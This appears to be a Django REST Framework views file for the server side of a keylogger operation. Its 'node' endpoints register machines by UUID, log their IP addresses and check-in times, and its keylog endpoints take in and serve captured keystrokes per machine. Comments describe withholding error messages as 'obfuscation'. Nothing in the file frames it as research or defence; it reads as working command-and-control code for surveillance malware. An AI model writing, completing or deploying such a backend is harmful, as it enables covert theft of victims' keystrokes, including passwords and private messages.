from django.shortcuts import get_object_or_404
from django.utils import timezone

from rest_framework import viewsets, status
from rest_framework.response import Response


from funguy_api.views.utils import get_ip
from ..serializers import *
from ..models import *


# can probably go back and just overwrite certain ModelViewSet methods,
# instead of writing all methods from scratch
class NodeViewSet(viewsets.ViewSet):
    serializer_class = NodeSerializer

    def list(self, request):
        queryset = Node.objects.all()
        serializer = NodeSerializer(queryset, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None):
        uuid = request.headers["uuid"]

        queryset = Node.objects.all()
        node = get_object_or_404(queryset, uuid=uuid)
        serializer = NodeSerializer(node)
        return Response(serializer.data)

    def create(self, request):
        request.data["ipv4"] = get_ip(request)
        serializer = NodeSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def update(self, request, pk=None):
        uuid = request.headers["uuid"]

        node = get_object_or_404(Node, uuid=uuid)

        node.last_seen = timezone.now()
        node.save()

        serializer = NodeSerializer(node, data=request.data)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_200_OK)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def partial_update(self, request, pk=None):
        uuid = request.headers["uuid"]

        node = get_object_or_404(Node, uuid=uuid)

        node.last_seen = timezone.now()
        node.save()

        serializer = NodeSerializer(node, data=request.data, partial=True)
        if serializer.is_valid():
            serializer.save()
            return Response(serializer.data, status=status.HTTP_200_OK)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def destroy(self, request, pk=None):
        uuid = request.headers["uuid"]

        node = get_object_or_404(Node, uuid=uuid)
        node.delete()
        return Response(status=status.HTTP_204_NO_CONTENT)


class KeylogViewSet(viewsets.ViewSet):
    def create(self, request):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])

        node.last_seen = timezone.now()
        node.save()

        # request.data["log_file"] = f'{node.uuid}@{timezone.now}.log'
        serializer = KeylogSerializer(data=request.data)
        if serializer.is_valid():
            serializer.save(node=node)
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        # don't return errors = obfuscation
        return Response(status=status.HTTP_400_BAD_REQUEST)

    def list(self, request):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])

        queryset = Keylog.objects.filter(node=node)
        serializer = KeylogSerializer(queryset, many=True)
        return Response(serializer.data)

    def retrieve(self, request, pk=None):
        node = get_object_or_404(Node, uuid=request.headers["uuid"])
        date_time = request.query_params["date_time"]

        queryset = Keylog.objects.filter(node=node, date_time=date_time)
        serializer = KeylogSerializer(queryset, many=True)
        return Response(serializer.data)
